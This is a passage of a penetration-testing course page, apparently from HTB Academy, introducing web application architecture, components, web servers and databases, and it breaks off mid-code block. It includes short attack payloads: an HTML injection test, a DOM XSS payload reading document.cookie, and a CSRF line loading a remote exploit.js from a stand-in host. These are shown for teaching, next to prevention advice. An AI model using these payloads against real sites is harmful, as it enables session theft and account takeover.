# Introduction to Web Applications

[Web applications](https://en.wikipedia.org/wiki/Web\_application) are interactive applications that run on web browsers.

Web applications usually adopt a [client-server architecture](https://cio-wiki.org/wiki/Client\_Server\_Architecture) to run and handle interactions.&#x20;

Some examples of typical web applications include online email services like `Gmail`, online retailers like `Amazon`, and online word processors like `Google Docs`.



### Web Applications vs. Websites

In the past, we interacted with websites that are static and cannot be changed in real-time.

To change the website's content, the corresponding page has to be edited by the developers manually. These types of static pages do not contain functions and, therefore, do not produce real-time changes. That type of website is also known as [Web 1.0](https://en.wikipedia.org/wiki/Web\_2.0#Web\_1.0).

<figure><img src="../../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>

On the other hand, most websites run web applications, or [Web 2.0](https://en.wikipedia.org/wiki/Web\_2.0) presenting dynamic content based on user interaction.

Another significant difference is that web applications are fully functional and can perform various functionalities for the end-user, while web sites lack this type of functionality.&#x20;

Other key differences between traditional websites and web applications include:

* Being modular
* Running on any display size
* Running on any platform without being optimized



### Web Application Distribution

There are many open-source web applications used by organizations worldwide that can be customized to meet each organization's needs. Some common open source web applications include:

* [WordPress](https://wordpress.com/)
* [OpenCart](https://www.opencart.com/)
* [Joomla](https://www.joomla.org/)

There are also proprietary 'closed source' web applications, which are usually developed by a certain organization and then sold to another organization or used by organizations through a subscription plan model. Some common closed source web applications include:

* [Wix](https://www.wix.com/)
* [Shopify](https://www.shopify.com/)
* [DotNetNuke](https://www.dnnsoftware.com/)



### Security Risks of Web Applications

Web application attacks are prevalent and present a challenge for most organizations with a web presence, regardless of their size.

One of the most current and widely used methods for testing web applications is the [OWASP Web Security Testing Guide](https://github.com/OWASP/wstg/tree/master/document/4-Web\_Application\_Security\_Testing).

One of the most common procedures is to start by reviewing a web application's front end components, such as `HTML`, `CSS` and `JavaScript` (also known as the front end trinity), and attempt to find vulnerabilities such as [Sensitive Data Exposure](https://owasp.org/www-project-top-ten/2017/A3\_2017-Sensitive\_Data\_Exposure) and [Cross-Site Scripting (XSS)](https://owasp.org/www-project-top-ten/2017/A7\_2017-Cross-Site\_Scripting\_\(XSS\)). Once all front end components are thoroughly tested, we would typically review the web application's core functionality and the interaction between the browser and the webserver to enumerate the technologies the webserver uses and look for exploitable flaws. We typically assess web applications from both an unauthenticated and authenticated perspective (if the application has login functionality) to maximize coverage and review every possible attack scenario.



### Attacking Web Applications

A few real-world examples of web application attacks and the impact are as follows:

| Flaw                                                                                                                                                                                         | Real-world Scenario                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| [SQL injection](https://owasp.org/www-community/attacks/SQL\_Injection)                                                                                                                      | Obtaining Active Directory usernames and performing a password spraying attack against a VPN or email portal.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| [File Inclusion](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web\_Application\_Security\_Testing/07-Input\_Validation\_Testing/11.1-Testing\_for\_Local\_File\_Inclusion) | Reading source code to find a hidden page or directory which exposes additional functionality that can be used to gain remote code execution.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| [Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted\_File\_Upload)                                                                                       | A web application that allows a user to upload a profile picture that allows any file type to be uploaded (not just images). This can be leveraged to gain full control of the web application server by uploading malicious code.                                                                                                                                                                                                                                                                                                                                                                                                   |
| [Insecure Direct Object Referencing (IDOR)](https://cheatsheetseries.owasp.org/cheatsheets/Insecure\_Direct\_Object\_Reference\_Prevention\_Cheat\_Sheet.html)                               | When combined with a flaw such as broken access control, this can often be used to access another user's files or functionality. An example would be editing your user profile browsing to a page such as /user/701/edit-profile. If we can change the `701` to `702`, we may edit another user's profile!                                                                                                                                                                                                                                                                                                                           |
| [Broken Access Control](https://owasp.org/www-project-top-ten/2017/A5\_2017-Broken\_Access\_Control)                                                                                         | Another example is an application that allows a user to register a new account. If the account registration functionality is designed poorly, a user may perform privilege escalation when registering. Consider the `POST` request when registering a new user, which submits the data `username=bjones&password=Welcome1&email=bjones@inlanefreight.local&roleid=3`. What if we can manipulate the `roleid` parameter and change it to `0` or `1`. We have seen real-world applications where this was the case, and it was possible to quickly register an admin user and access many unintended features of the web application. |



Web Application Layout

Web application layouts consist of many different layers that can be summarized with the following three main categories:

| **Category**                     | **Description**                                                                                                                                                                                                                                                      |
| -------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Web Application Infrastructure` | Describes the structure of required components, such as the database, needed for the web application to function as intended. Since the web application can be set up to run on a separate server, it is essential to know which database server it needs to access. |
| `Web Application Components`     | The components that make up a web application represent all the components that the web application interacts with. These are divided into the following three areas: `UI/UX`, `Client`, and `Server` components.                                                    |
| `Web Application Architecture`   | Architecture comprises all the relationships between the various web application components.                                                                                                                                                                         |



### Web Application Infrastructure

Web applications can use many different infrastructure setups. These are also called `models`. The most common ones can be grouped into the following four types:

* `Client-Server`
* `One Server`
* `Many Servers - One Database`
* `Many Servers - Many Databases`

**Client-Server**

Web applications often adopt the `client-server` model. A server hosts the web application in a client-server model and distributes it to any clients trying to access it.

![](<../../.gitbook/assets/image (85).png>)\
In this model, web applications have two types of components, those in the front end, which are usually interpreted and executed on the client-side (browser), and components in the back end, usually compiled, interpreted, and executed by the hosting server.



**One Server**

In this architecture, the entire web application or even several web applications and their components, including the database, are hosted on a single server. Though this design is straightforward and easy to implement, it is also the riskiest design.

<figure><img src="../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

If any web application hosted on this server is compromised in this architecture, then all web applications' data will be compromised. This design represents an "`all eggs in one basket`" approach since if any of the hosted web applications are vulnerable, the entire webserver becomes vulnerable.





**Many Servers - One Database**

This model separates the database onto its own database server and allows the web applications' hosting server to access the database server to store and retrieve data. It can be seen as many-servers to one-database and one-server to one-database, as long as the database is separated on its own database server.

<figure><img src="../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

This model can allow several web applications to access a single database to have access to the same data without syncing the data between them. The web applications can be replications of one main application (i.e., primary/backup), or they can be separate web applications that share common data.

This model's main advantage (`from a security point of view`) is segmentation, where each of the main components of a web application is located and hosted separately. In case one webserver is compromised, other webservers are not directly affected. Similarly, if the database is compromised (i.e., through a SQL injection vulnerability), the web application itself is not directly affected. There are still access control measures that need to be implemented after asset segmentation, such as limiting web application access to only data needed to function as intended.



**Many Servers - Many Databases**

This model builds upon the `Many Servers, One Database` model. However, within the database server, each web application's data is hosted in a separate database. The web application can only access private data and only common data that is shared across web applications. It is also possible to host each web application's database on its separate database server.

<figure><img src="../../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

This design is also widely used for redundancy purposes, so if any web server or database goes offline, a backup will run in its place to reduce downtime as much as possible. Although this may be more difficult to implement and may require tools like [load balancers](https://en.wikipedia.org/wiki/Load\_balancing\_\(computing\)) to function appropriately, this architecture is one of the best choices in terms of security due to its proper access control measures and proper asset segmentation.

Aside from these models, there are other web application models available such as [serverless](https://aws.amazon.com/lambda/serverless-architectures-learn-more) web applications or web applications that utilize [microservices](https://aws.amazon.com/microservices).



### Web Application Components

Each web application can have a different number of components. Nevertheless, all of the components of the models mentioned previously can be broken down to:

1. `Client`
2. `Server`
   * Webserver
   * Web Application Logic
   * Database
3. `Services` (Microservices)
   * 3rd Party Integrations
   * Web Application Integrations
4. `Functions` (Serverless)



### Web Application Architecture

The components of a web application are divided into three different layers (AKA Three Tier Architecture).

| **Layer**            | **Description**                                                                                                                                                                                                     |
| -------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Presentation Layer` | Consists of UI process components that enable communication with the application and the system. These can be accessed by the client via the web browser and are returned in the form of HTML, JavaScript, and CSS. |
| `Application Layer`  | This layer ensures that all client requests (web requests) are correctly processed. Various criteria are checked, such as authorization, privileges, and data passed on to the client.                              |
| `Data Layer`         | The data layer works closely with the application layer to determine exactly where the required data is stored and can be accessed.                                                                                 |

An example of a web application architecture could look something like this:

<figure><img src="../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>



## **Microservices**

We can think of microservices as independent components of the web application, which in most cases are programmed for one task only. For example, for an online store, we can decompose core tasks into the following components:

* Registration
* Search
* Payments
* Ratings
* Reviews

These components communicate with the client and with each other. The communication between these microservices is `stateless`, which means that the request and response are independent. This is because the stored data is `stored separately` from the respective microservices. The use of microservices is considered [service-oriented architecture (SOA)](https://en.wikipedia.org/wiki/Service-oriented\_architecture), built as a collection of different automated functions focused on a single business goal. Nevertheless, these microservices depend on each other.

Some benefits of microservices include:

* Agility
* Flexible scaling
* Easy deployment
* Reusable code
* Resilience



## Serverless&#x20;

Cloud providers such as AWS, GCP, Azure, among others, offer serverless architectures. These platforms provide application frameworks to build such web applications without having to worry about the servers themselves. These web applications then run in stateless computing containers (Docker, for example). This type of architecture gives a company the flexibility to build and deploy applications and services without having to manage infrastructure.



## Front End vs Back End

### Front End

The front end of a web application contains the user's components directly through their web browser (client-side).&#x20;

These components make up the source code of the web page we view when visiting a web application and usually include `HTML`, `CSS`, and `JavaScript`, which is then interpreted in real-time by our browsers.

Aside from frontend code development, the following are some of the other tasks related to front end web application development:

* Visual Concept Web Design
* User Interface (UI) design
* User Experience (UX) design

### Back End

The back end of a web application drives all of the core web application functionalities, all of which is executed at the back end server, which processes everything required for the web application to run correctly. It is the part we may never see or directly interact with, but a website is just a collection of static web pages without a back end.

There are four main back end components for web applications:

| **Component**            | **Description**                                                                                                                                                                                                              |
| ------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Back end Servers`       | The hardware and operating system that hosts all other components and are usually run on operating systems like `Linux`, `Windows`, or using `Containers`.                                                                   |
| `Web Servers`            | Web servers handle HTTP requests and connections. Some examples are `Apache`, `NGINX`, and `IIS`.                                                                                                                            |
| `Databases`              | Databases (`DBs`) store and retrieve the web application data. Some examples of relational databases are `MySQL`, `MSSQL`, `Oracle`, `PostgreSQL`, while examples of non-relational databases include `NoSQL` and `MongoDB`. |
| `Development Frameworks` | Development Frameworks are used to develop the core Web Application. Some well-known frameworks include `Laravel` (`PHP`), `ASP.NET` (`C#`), `Spring` (`Java`), `Django` (`Python`), and `Express` (`NodeJS JavaScript`).    |

<figure><img src="../../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>

It is also possible to host each component of the back end on its own isolated server, or in isolated containers, by utilizing services such as [Docker](https://www.docker.com/).

Some of the main jobs performed by back end components include:

* Develop the main logic and services of the back end of the web application
* Develop the main code and functionalities of the web application
* Develop and maintain the back end database
* Develop and implement libraries to be used by the web application
* Implement technical/business needs for the web application
* Implement the main [APIs](https://en.wikipedia.org/wiki/API) for front end component communications
* Integrate remote servers and cloud services into the web application



## Securing Front/Back End

Even though in most cases, we will not have access to the back end code to analyze the individual functions and the structure of the code, it does not make the application invulnerable. It could still be exploited by various injection attacks, for example.

The `top 20` most common mistakes web developers make that are essential for us as penetration testers are:

| **No.** | **Mistake**                                        |
| ------- | -------------------------------------------------- |
| `1.`    | Permitting Invalid Data to Enter the Database      |
| `2.`    | Focusing on the System as a Whole                  |
| `3.`    | Establishing Personally Developed Security Methods |
| `4.`    | Treating Security to be Your Last Step             |
| `5.`    | Developing Plain Text Password Storage             |
| `6.`    | Creating Weak Passwords                            |
| `7.`    | Storing Unencrypted Data in the Database           |
| `8.`    | Depending Excessively on the Client Side           |
| `9.`    | Being Too Optimistic                               |
| `10.`   | Permitting Variables via the URL Path Name         |
| `11.`   | Trusting third-party code                          |
| `12.`   | Hard-coding backdoor accounts                      |
| `13.`   | Unverified SQL injections                          |
| `14.`   | Remote file inclusions                             |
| `15.`   | Insecure data handling                             |
| `16.`   | Failing to encrypt data properly                   |
| `17.`   | Not using a secure cryptographic system            |
| `18.`   | Ignoring layer 8                                   |
| `19.`   | Review user actions                                |
| `20.`   | Web Application Firewall misconfigurations         |

These mistakes lead to the [OWASP Top 10](https://owasp.org/www-project-top-ten/) vulnerabilities for web applications, which we will discuss in other modules:

| **No.** | **Vulnerability**                          |
| ------- | ------------------------------------------ |
| `1.`    | Broken Access Control                      |
| `2.`    | Cryptographic Failures                     |
| `3.`    | Injection                                  |
| `4.`    | Insecure Design                            |
| `5.`    | Security Misconfiguration                  |
| `6.`    | Vulnerable and Outdated Components         |
| `7.`    | Identification and Authentication Failures |
| `8.`    | Software and Data Integrity Failures       |
| `9.`    | Security Logging and Monitoring Failures   |
| `10.`   | Server-Side Request Forgery (SSRF)         |



## HTML

HTML is at the very core of any web page we see on the internet. It contains each page's basic elements, including titles, forms, images, and many other elements. The web browser, in turn, interprets these elements and displays them to the end-user.

**Example**

Code: html

```html
<!DOCTYPE html>
<html>
    <head>
        <title>Page Title</title>
    </head>
    <body>
        <h1>A Heading</h1>
        <p>A Paragraph</p>
    </body>
</html>
```

As we can see, HTML elements are displayed in a tree form, similar to `XML` and other languages:

\
HTML

```shell-session
document
 - html
   -- head
      --- title
   -- body
      --- h1
      --- p
```

Each element can contain other HTML elements, while the main `HTML` tag should contain all other elements within the page, which falls under `document`, distinguishing between `HTML` and documents written for other languages, such as `XML` documents.



### URL Encoding

For a browser to properly display a page's contents, it has to know the charset in use. In URLs, for example, browsers can only use [ASCII](https://en.wikipedia.org/wiki/ASCII) encoding, which only allows alphanumerical characters and certain special characters. Therefore, all other characters outside of the ASCII character-set have to be encoded within a URL. URL encoding replaces unsafe ASCII characters with a `%` symbol followed by two hexadecimal digits.

For example, the single-quote character '`'`' is encoded to '`%27`', which can be understood by browsers as a single-quote. URLs cannot have spaces in them and will replace a space with either a `+` (plus sign) or `%20`. Some common character encodings are:

| Character | Encoding |
| --------- | -------- |
| space     | %20      |
| !         | %21      |
| "         | %22      |
| #         | %23      |
| $         | %24      |
| %         | %25      |
| &         | %26      |
| '         | %27      |
| (         | %28      |
| )         | %29      |

**Usage**

The `<head>` element usually contains elements that are not directly printed on the page, like the page title, while all main page elements are located under `<body>`. Other important elements include the `<style>`, which holds the page's CSS code, and the `<script>`, which holds the JS code of the page, as we will see in the next section.

Each of these elements is called a [DOM (Document Object Model)](https://en.wikipedia.org/wiki/Document\_Object\_Model).

The DOM standard is separated into 3 parts:

* `Core DOM` - the standard model for all document types
* `XML DOM` - the standard model for XML documents
* `HTML DOM` - the standard model for HTML documents



## CSS

**Example**

At a fundamental level, CSS is used to define the style of each class or type of HTML elements (i.e., `body` or `h1`), such that any element within that page would be represented as defined in the CSS file. This could include the font family, font size, background color, text color and alignment, and more.

Code: css

```css
body {
  background-color: black;
}

h1 {
  color: white;
  text-align: center;
}

p {
  font-family: helvetica;
  font-size: 10px;
}
```



### Frameworks

&#x20;Some of the most common CSS frameworks are:

* [Bootstrap](https://www.w3schools.com/bootstrap4/)
* [SASS](https://sass-lang.com/)
* [Foundation](https://en.wikipedia.org/wiki/Foundation\_\(framework\))
* [Bulma](https://bulma.io/)
* [Pure](https://purecss.io/)



## JavaScript

**Example**

Within the page source code, `JavaScript` code is loaded with the `<script>` tag, as follows:

Code: html

```html
<script type="text/javascript">
..JavaScript code..
</script>
```

A web page can also load remote `JavaScript` code with `src` and the script's link, as follows:

Code: html

```html
<script src="./script.js"></script>
```

An example of basic use of `JavaScript` within a web page is the following:

Code: javascript

```javascript
document.getElementById("button1").innerHTML = "Changed Text!";
```



### Frameworks

Some of the most common front end `JavaScript` frameworks are:

* [Angular](https://www.w3schools.com/angular/angular\_intro.asp)
* [React](https://www.w3schools.com/react/react\_intro.asp)
* [Vue](https://www.w3schools.com/whatis/whatis\_vue.asp)
* [jQuery](https://www.w3schools.com/jquery/)



## Sensitive Data Exposure

All of the `front end` components we covered are interacted with on the client-side. Therefore, if they are attacked, they do not pose a direct threat to the core `back end` of the web application and usually will not lead to permanent damage.

[Sensitive Data Exposure](https://owasp.org/www-project-top-ten/2017/A3\_2017-Sensitive\_Data\_Exposure) refers to the availability of sensitive data in clear-text to the end-user. This is usually found in the `source code` of the web page or page source on the front end of web applications.&#x20;

Sometimes we may find login `credentials`, `hashes`, or other sensitive data hidden in the comments of a web page's source code or within external `JavaScript` code being imported.&#x20;

### Prevention

Ideally, the front end source code should only contain the code necessary to run all of the web applications functions, without any extra code or comments that are not necessary for the web application to function properly.



HTML Injection

[HTML injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web\_Application\_Security\_Testing/11-Client-side\_Testing/03-Testing\_for\_HTML\_Injection) occurs when unfiltered user input is displayed on the page. This can either be through retrieving previously submitted code, like retrieving a user comment from the back end database, or by directly displaying unfiltered user input through `JavaScript` on the front end.

When a user has complete control of how their input will be displayed, they can submit `HTML` code, and the browser may display it as part of the page. This may include a malicious `HTML` code, like an external login form, which can be used to trick users into logging in while actually sending their login credentials to a malicious server to be collected for other attacks.

Another example of `HTML Injection` is web page defacing. This consists of injecting new `HTML` code to change the web page's appearance, inserting malicious ads, or even completely changing the page. This type of attack can result in severe reputational damage to the company hosting the web application.



**Example**

The following example is a very basic web page with a single button "`Click to enter your name`." When we click on the button, it prompts us to input our name and then displays our name as "`Your name is ...`":

<figure><img src="../../.gitbook/assets/image (214).png" alt=""><figcaption></figcaption></figure>

If no input sanitization is in place, this is potentially an easy target for `HTML Injection` and `Cross-Site Scripting (XSS)` attacks. We take a look at the page source code and see no input sanitization in place whatsoever, as the page takes user input and directly displays it:

```html
<!DOCTYPE html>
<html>

<body>
    <button onclick="inputFunction()">Click to enter your name</button>
    <p id="output"></p>

    <script>
        function inputFunction() {
            var input = prompt("Please enter your name", "");

            if (input != null) {
                document.getElementById("output").innerHTML = "Your name is " + input;
            }
        }
    </script>
</body>

</html>
```

To test for `HTML Injection`, we can simply input a small snippet of `HTML` code as our name, and see if it is displayed as part of the page. We will test the following code, which changes the background image of the web page:

```html
<style> body { background-image: url('https://academy.hackthebox.com/images/logo.svg'); } </style>
```

<figure><img src="../../.gitbook/assets/image (215).png" alt=""><figcaption></figcaption></figure>



## Cross-Site Scripting (XSS)

`HTML Injection` vulnerabilities can often be utilized to also perform [Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) attacks by injecting `JavaScript` code to be executed on the client-side.

`XSS` is very similar to `HTML Injection` in practice. However, `XSS` involves the injection of `JavaScript` code to perform more advanced attacks on the client-side, instead of merely injecting HTML code. There are three main types of `XSS`:

| Type            | Description                                                                                                                               |
| --------------- | ----------------------------------------------------------------------------------------------------------------------------------------- |
| `Reflected XSS` | Occurs when user input is displayed on the page after processing (e.g., search result or error message).                                  |
| `Stored XSS`    | Occurs when user input is stored in the back end database and then displayed upon retrieval (e.g., posts or comments).                    |
| `DOM XSS`       | Occurs when user input is directly shown in the browser and is written to an `HTML` DOM object (e.g., vulnerable username or page title). |

In the example we saw for `HTML Injection`, there was no input sanitization whatsoever. Therefore, it may be possible for the same page to be vulnerable to `XSS` attacks. We can try to inject the following `DOM XSS` `JavaScript` code as a payload, which should show us the cookie value for the current user:

Code: javascript

```javascript
#"><img src=/ onerror=alert(document.cookie)>
```

<figure><img src="../../.gitbook/assets/image (216).png" alt=""><figcaption></figcaption></figure>

This payload is accessing the `HTML` document tree and retrieving the `cookie` object's value. When the browser processes our input, it will be considered a new `DOM`, and our `JavaScript` will be executed, displaying the cookie value back to us in a popup.



Cross-Site Request Forgery (CSRF)

The third type of front end vulnerability that is caused by unfiltered user input is [Cross-Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf).

`CSRF` attacks may utilize `XSS` vulnerabilities to perform certain queries, and `API` calls on a web application that the victim is currently authenticated to. This would allow the attacker to perform actions as the authenticated user. It may also utilize other vulnerabilities to perform the same functions, like utilizing HTTP parameters for attacks.

A common `CSRF` attack to gain higher privileged access to a web application is to craft a `JavaScript` payload that automatically changes the victim's password to the value set by the attacker. Once the victim views the payload on the vulnerable page (e.g., a malicious comment containing the `JavaScript` `CSRF` payload), the `JavaScript` code would execute automatically. It would use the victim's logged-in session to change their password. Once that is done, the attacker can log in to the victim's account and control it.

Following this example, instead of using `JavaScript` code that would return the session cookie, we would load a remote `.js` (`JavaScript`) file, as follows:

Code: html

```html
"><script src=//www.example.com/exploit.js></script>
```



### Prevention

Though there should be measures on the back end to detect and filter user input, it is also always important to filter and sanitize user input on the front end before it reaches the back end, and especially if this code may be displayed directly on the client-side without communicating with the back end. Two main controls must be applied when accepting user input:

| Type           | Description                                                                                                 |
| -------------- | ----------------------------------------------------------------------------------------------------------- |
| `Sanitization` | Removing special characters and non-standard characters from user input before displaying it or storing it. |
| `Validation`   | Ensuring that submitted user input matches the expected format (i.e., submitted email matched email format) |

Once we sanitize and/or validate user input and displayed output, we should be able to prevent attacks like `HTML Injection`, `XSS`, or `CSRF`. Another solution would be to implement a [web application firewall (WAF)](https://en.wikipedia.org/wiki/Web\_application\_firewall), which should help to prevent injection attempts automatically. However, it should be noted that WAF solutions can potentially be bypassed, so developers should follow coding best practices and not merely rely on an appliance to detect/block attacks.

As for `CSRF`, many modern browsers have built-in anti-CSRF measures, which prevent automatically executing `JavaScript` code. Furthermore, many modern web applications have anti-CSRF measures, including certain HTTP headers and flags that can prevent automated requests (i.e., `anti-CSRF` token, or `http-only`/`X-XSS-Protection`).

This [Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site\_Request\_Forgery\_Prevention\_Cheat\_Sheet.html) from OWASP discusses the attack and prevention measures in greater detail.



## Back End Servers

A back-end server is the hardware and operating system on the back end that hosts all of the applications necessary to run the web application. It is the real system running all of the processes and carrying out all of the tasks that make up the entire web application. The back end server would fit in the [Data access layer](https://en.wikipedia.org/wiki/Data\_access\_layer).

### Software

The back end server contains the other 3 back end components:

* `Web Server`
* `Database`
* `Development Framework`

Other software components on the back end server may include [hypervisors](https://en.wikipedia.org/wiki/Hypervisor), containers, and WAFs.

There are many popular combinations of "stacks" for back-end servers, which contain a specific set of back end components. Some common examples include:

| Combinations                                                          | Components                                         |
| --------------------------------------------------------------------- | -------------------------------------------------- |
| [LAMP](https://en.wikipedia.org/wiki/LAMP\_\(software\_bundle\))      | `Linux`, `Apache`, `MySQL`, and `PHP`.             |
| [WAMP](https://en.wikipedia.org/wiki/LAMP\_\(software\_bundle\)#WAMP) | `Windows`, `Apache`, `MySQL`, and `PHP`.           |
| [WINS](https://en.wikipedia.org/wiki/Solution\_stack)                 | `Windows`, `IIS`, `.NET`, and `SQL Server`         |
| [MAMP](https://en.wikipedia.org/wiki/MAMP)                            | `macOS`, `Apache`, `MySQL`, and `PHP`.             |
| [XAMPP](https://en.wikipedia.org/wiki/XAMPP)                          | Cross-Platform, `Apache`, `MySQL`, and `PHP/PERL`. |



## Web Servers

A [web server](https://en.wikipedia.org/wiki/Web\_server) is an application that runs on the back end server, which handles all of the HTTP traffic from the client-side browser, routes it to the requested pages, and finally responds to the client-side browser. Web servers usually run on TCP [ports](https://en.wikipedia.org/wiki/Port\_\(computer\_networking\)) `80` or `443`, and are responsible for connecting end-users to various parts of the web application, in addition to handling their various responses.

### Workflow

A typical web server accepts HTTP requests from the client-side, and responds with different HTTP responses and codes, like a code `200 OK` response for a successful request, a code `404 NOT FOUND` when requesting pages that do not exist, code `403 FORBIDDEN` for requesting access to restricted pages, and so on.

<figure><img src="../../.gitbook/assets/image (217).png" alt=""><figcaption></figcaption></figure>

The following are some of the most common [HTTP response codes](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status):

| Code                        | Description                                                                                                         |
| --------------------------- | ------------------------------------------------------------------------------------------------------------------- |
| **Successful responses**    |                                                                                                                     |
| `200 OK`                    | The request has succeeded                                                                                           |
| **Redirection messages**    |                                                                                                                     |
| `301 Moved Permanently`     | The URL of the requested resource has been changed permanently                                                      |
| `302 Found`                 | The URL of the requested resource has been changed temporarily                                                      |
| **Client error responses**  |                                                                                                                     |
| `400 Bad Request`           | The server could not understand the request due to invalid syntax                                                   |
| `401 Unauthorized`          | Unauthenticated attempt to access page                                                                              |
| `403 Forbidden`             | The client does not have access rights to the content                                                               |
| `404 Not Found`             | The server can not find the requested resource                                                                      |
| `405 Method Not Allowed`    | The request method is known by the server but has been disabled and cannot be used                                  |
| `408 Request Timeout`       | This response is sent on an idle connection by some servers, even without any previous request by the client        |
| **Server error responses**  |                                                                                                                     |
| `500 Internal Server Error` | The server has encountered a situation it doesn't know how to handle                                                |
| `502 Bad Gateway`           | The server, while working as a gateway to get a response needed to handle the request, received an invalid response |
| `504 Gateway Timeout`       | The server is acting as a gateway and cannot get a response in time                                                 |

The following shows an example of requesting a page in a Linux terminal using the [cURL](https://en.wikipedia.org/wiki/CURL) utility, and receiving the server response while using the `-I` flag, which displays the headers:

&#x20; Web Servers

```shell-session
TomasFerreira@htb[/htb]$ curl -I https://academy.hackthebox.com

HTTP/2 200
date: Tue, 15 Dec 2020 19:54:29 GMT
content-type: text/html; charset=UTF-8
...SNIP...
```

While this `cURL` command example shows us the source code of the webpage:

&#x20; Web Servers

```shell-session
TomasFerreira@htb[/htb]$ curl https://academy.hackthebox.com

<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<title>Cyber Security Training : HTB Academy</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
```



### Apache

[Apache](https://www.apache.org/) 'or `httpd`' is the most common web server on the internet, hosting more than `40%` of all internet websites. `Apache` usually comes pre-installed in most `Linux` distributions and can also be installed on Windows and macOS servers.

`Apache` is usually used with `PHP` for web application development, but it also supports other languages like `.Net`, `Python`, `Perl`, and even OS languages like `Bash` through `CGI`. Users can install a wide variety of `Apache` modules to extend its functionality and support more languages. For example, to support serving `PHP` files, users must install `PHP` on the back end server, in addition to installing the `mod_php` module for `Apache`.



### NGINX

[NGINX](https://www.nginx.com/) is the second most common web server on the internet, hosting roughly `30%` of all internet websites. `NGINX` focuses on serving many concurrent web requests with relatively low memory and CPU load by utilizing an async architecture to do so. This makes `NGINX` a very reliable web server for popular web applications and top businesses worldwide, which is why it is the most popular web server among high traffic websites, with around 60% of the top 100,000 websites using `NGINX`.



### IIS

[IIS (Internet Information Services)](https://en.wikipedia.org/wiki/Internet\_Information\_Services) is the third most common web server on the internet, hosting around `15%` of all internet web sites. `IIS` is developed and maintained by Microsoft and mainly runs on Microsoft Windows Servers. `IIS` is usually used to host web applications developed for the Microsoft .NET framework, but can also be used to host web applications developed in other languages like `PHP`, or host other types of services like `FTP`. Furthermore, `IIS` is very well optimized for Active Directory integration and includes features like `Windows Auth` for authenticating users using Active Directory, allowing them to automatically sign in to web applications.



## Databases

Web applications utilize back end [databases](https://en.wikipedia.org/wiki/Database) to store various content and information related to the web application. This can be core web application assets like images and files, web application content like posts and updates, or user data like usernames and passwords. This allows web applications to easily and quickly store and retrieve data and enable dynamic content that is different for each user.

### Relational (SQL)

[Relational](https://en.wikipedia.org/wiki/Relational\_database) (SQL) databases store their data in tables, rows, and columns. Each table can have unique keys, which can link tables together and create relationships between tables.

For example, we can have a `users` table in a relational database containing columns like `id`, `username`, `first_name`, `last_name`, and so on. The `id` can be used as the table key. Another table, `posts`, may contain posts made by all users, with columns like `id`, `user_id`, `date`, `content`, and so on.

<figure><img src="../../.gitbook/assets/image (218).png" alt=""><figcaption></figcaption></figure>

The relationship between tables within a database is called a Schema.

Some of the most common relational databases include:

| Type                                                          | Description                                                                                                                                                                                   |
| ------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [MySQL](https://en.wikipedia.org/wiki/MySQL)                  | The most commonly used database around the internet. It is an open-source database and can be used completely free of charge                                                                  |
| [MSSQL](https://en.wikipedia.org/wiki/Microsoft\_SQL\_Server) | Microsoft's implementation of a relational database. Widely used with Windows Servers and IIS web servers                                                                                     |
| [Oracle](https://en.wikipedia.org/wiki/Oracle\_Database)      | A very reliable database for big businesses, and is frequently updated with innovative database solutions to make it faster and more reliable. It can be costly, even for big businesses      |
| [PostgreSQL](https://en.wikipedia.org/wiki/PostgreSQL)        | Another free and open-source relational database. It is designed to be easily extensible, enabling adding advanced new features without needing a major change to the initial database design |

Other common SQL databases include: `SQLite`, `MariaDB`, `Amazon Aurora`, and `Azure SQL`.



### Non-relational (NoSQL)

A [non-relational database](https://en.wikipedia.org/wiki/NoSQL) does not use tables, rows, columns, primary keys, relationships, or schemas. Instead, a `NoSQL` database stores data using various storage models, depending on the type of data stored.

There are 4 common storage models for `NoSQL` databases:

* Key-Value
* Document-Based
* Wide-Column
* Graph

<figure><img src="../../.gitbook/assets/image (219).png" alt=""><figcaption></figcaption></figure>

Some of the most common `NoSQL` databases include:

| Type                                                                | Description                                                                                                                                                                                      |
| ------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| [MongoDB](https://en.wikipedia.org/wiki/MongoDB)                    | The most common `NoSQL` database. It is free and open-source, uses the `Document-Based` model, and stores data in `JSON` objects                                                                 |
| [ElasticSearch](https://en.wikipedia.org/wiki/Elasticsearch)        | Another free and open-source `NoSQL` database. It is optimized for storing and analyzing huge datasets. As its name suggests, searching for data within this database is very fast and efficient |
| [Apache Cassandra](https://en.wikipedia.org/wiki/Apache\_Cassandra) | Also free and open-source. It is very scalable and is optimized f                                                                                                                                |



### Use in Web Applications

Most modern web development languages and frameworks make it easy to integrate, store, and retrieve data from various database types. But first, the database has to be installed and set up on the back end server, and once it is up and running, the web applications can start utilizing it to store and retrieve data.

For example, within a `PHP` web application, once `MySQL` is up and running, we can connect to the database server with:

Code: php

```php
